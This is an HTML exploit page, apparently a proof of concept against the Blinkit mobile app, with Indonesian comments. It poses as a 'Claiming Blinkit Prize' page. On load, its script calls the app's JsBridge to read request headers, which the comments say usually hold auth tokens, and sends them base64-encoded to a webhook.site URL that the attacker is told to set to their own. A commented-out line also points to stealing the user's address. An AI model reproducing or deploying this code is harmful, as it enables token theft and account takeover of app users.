<!DOCTYPE html>
<html>
<head>
    <title>Blinkit Critical Exploit</title>

    <style>body { font-family: sans-serif; padding: 20px; word-wrap: break-word; }</style>

<body>
    <h1>üéÅ Claiming Blinkit Prize...</h1>
    <div id="status">Waiting for bridge...</div>
    <div id="result" style="color: red; font-weight: bold; margin-top: 20px;"></div>

    <script>
        function attack() {
            var statusDiv = document.getElementById("status");
            var resultDiv = document.getElementById("result");

            try {
                // Cek apakah korban membuka ini lewat Aplikasi Blinkit
                if (window.JsBridge) {
                    statusDiv.innerText = "Bridge FOUND! Extracting data...";

                    // 1. CURI HEADERS (Biasanya isinya Auth Token)
                    var secretHeaders = window.JsBridge.getHeaders();
                    
                    // Tampilkan di layar (Bukti PoC)
                    resultDiv.innerText = "STOLEN HEADERS: " + secretHeaders;

                    // 2. EXFILTRATION (Kirim ke Server Kita)
                    // Ganti URL webhook.site dengan punya kamu
                    var exfilUrl = "https://webhook.site/YOUR-UNIQUE-ID?data=" + btoa(secretHeaders);
                    fetch(exfilUrl);

                    // 3. Optional: Curi Alamat juga
                    // window.JsBridge.getAddress(true); 

                } else {
                    statusDiv.innerText = "Error: JsBridge object not found. Open this inside Blinkit App!";
                }
            } catch (e) {
                resultDiv.innerText = "Exploit Failed: " + e.message;
            }
        }

        // Jalankan serangan setelah halaman dimuat
        setTimeout(attack, 1000);
    </script>
</body>
